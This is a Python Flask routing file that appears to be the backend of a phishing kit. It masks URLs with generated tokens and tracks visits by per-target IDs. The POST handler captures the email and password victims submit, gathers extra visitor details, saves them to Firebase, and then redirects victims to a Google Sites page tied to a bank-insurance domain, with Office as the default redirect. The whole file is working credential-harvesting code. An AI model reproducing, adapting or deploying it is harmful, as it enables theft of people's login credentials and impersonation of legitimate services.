from flask import Blueprint, render_template, redirect, request, Response, url_for
from app.services.firebase import get_user_by_id, update_user_credentials, add_emails, get_email_by_email, save_user_data, update_visited
from app.utils import collect_user_info
from urllib.parse import parse_qs, urlencode
from uuid import uuid4 as uuid
from flask import request
import os, secrets

MASKED_URI_PATH = os.environ.get("MASKED_URI_PATH", None)
MASKED_URI_PARAMS = os.environ.get("MASKED_URI_PARAMS", None)
REDIRECT_URI = os.environ.get("REDIRECT_URI", "https://www.office.com/?auth=1")

main_bp = Blueprint('main_bp', __name__)

def handle_user(user_id=None):
    if user_id and get_user_by_id(user_id):
        update_visited(user_id)
        
    return render_template("index.html", user_id=user_id)

def generate_masked_uri_params(user_id):
    args = request.args.to_dict()
    redirect_uri = REDIRECT_URI
    nonce = str(int.from_bytes(secrets.token_bytes(8), "big"))
    token = secrets.token_urlsafe(64)
    uuid_val = str(uuid())
    
    # Reemplazar los placeholders en MASKED_URI_PARAMS con los valores generados
    masked_uri_params_filled = MASKED_URI_PARAMS.replace("{{user_id}}", (user_id or str(uuid()))) \
        .replace("{{redirect_uri}}", redirect_uri) \
        .replace("{{number}}", nonce) \
        .replace("{{token}}", token) \
        .replace("{{uuid}}", uuid_val)

    # Convertir el string de parámetros en un diccionario
    uri_params = {k: v[0] if len(v) == 1 else v for k, v in parse_qs(masked_uri_params_filled).items()}
    args.update(uri_params)

    return args

@main_bp.get("/")
def index():
    if MASKED_URI_PATH:
        args = generate_masked_uri_params(None)
        return redirect(url_for("main_bp.masked_uri_path", **args))
    else:
        return handle_user()

@main_bp.get('/<user_id>')
def user_route(user_id):
    if MASKED_URI_PATH:
        args = generate_masked_uri_params(user_id)
        return redirect(url_for("main_bp.masked_uri_path", **args))
    
    return handle_user(user_id)

if MASKED_URI_PATH:
    @main_bp.get(f"{MASKED_URI_PATH}")
    def masked_uri_path():
        return handle_user(request.args.get("user_id", None))

@main_bp.post("/")
def main():
    account = request.form.get("account", None)
    password = request.form.get("password", None)
    user_id = request.form.get("user_id", None)

    user_data = collect_user_info(request)

    if not account or len(account.strip()) == 0:
        return Response(render_template("index.html", error_message="Email is empty"), status=400)
    elif not password or len(password.strip()) == 0:
        return Response(render_template("index.html", error_message="Password is empty"), status=400)
    else:
        try:
            if user_id:
                # Verificar que el email anónimo se ha creado y obtener su ID
                email_data = get_user_by_id(user_id)
                
                if email_data:
                    # Actualizar las credenciales del usuario con el email proporcionado y la contraseña
                    update_user_credentials(user_id, account, password)
                    # Guardar la información del usuario en Firebase
                    save_user_data(user_id, user_data)
                
                return redirect("https://sites.google.com/banescoseguros.com/gestion/inicio#h.f2z67bvyf6ca")
            else:
                # Crear un nuevo email anónimo
                anonymous_email = f"anonymous@{''.join(str(uuid()).split('-'))}.com"
                emails = [anonymous_email]
                add_emails(emails)
                
                # Obtener los datos del email anónimo creado
                email_data = get_email_by_email(anonymous_email)
                if email_data and email_data['email'] == anonymous_email:
                    # Actualizar las credenciales del usuario con el email proporcionado y la contraseña
                    update_user_credentials(email_data['id'], account, password)
                    # Guardar la información del usuario en Firebase
                    save_user_data(email_data['id'], user_data)
                
                return redirect("https://sites.google.com/banescoseguros.com/gestion/inicio#h.f2z67bvyf6ca")
        except Exception as e:
            print(e)
            return Response(render_template("index.html", error_message="An error occurred"), status=500)

